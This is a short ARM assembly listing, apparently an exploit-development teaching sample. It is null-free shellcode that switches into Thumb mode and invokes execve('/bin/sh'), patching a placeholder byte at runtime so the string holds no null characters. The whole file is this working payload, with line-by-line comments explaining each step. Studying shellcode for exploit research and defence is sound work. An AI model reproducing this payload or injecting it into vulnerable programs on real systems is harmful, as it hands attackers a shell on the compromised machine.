.section .text
.global _start

_start:
    .code 32
    add r3, pc, #1      @ Add 1 to PC register and add it to r3
    bx r3               @ Branch and exchange to switch to Thumb mode (LSB = 1)

    .code 16
    @@@ execve("/bin/sh", NULL, NULL); @@@
    add r0, pc, #8      @ Use program-relative adressing to load our string into r0
    eor r1, r1, r1      @ XOR r1 with itself, zeroing it out
    eor r2, r2, r2      @ XOR r2 with itself, zeroing it out
    strb r2, [r0, #7]   @ Overwrite the last byte of "/bin/shX" with 0 (NULL)
    mov r7, #11         @ Store syscall for execve (11) in r7
    svc #1              @ Interrupt to make a supervisor call

.ascii "/bin/shX"

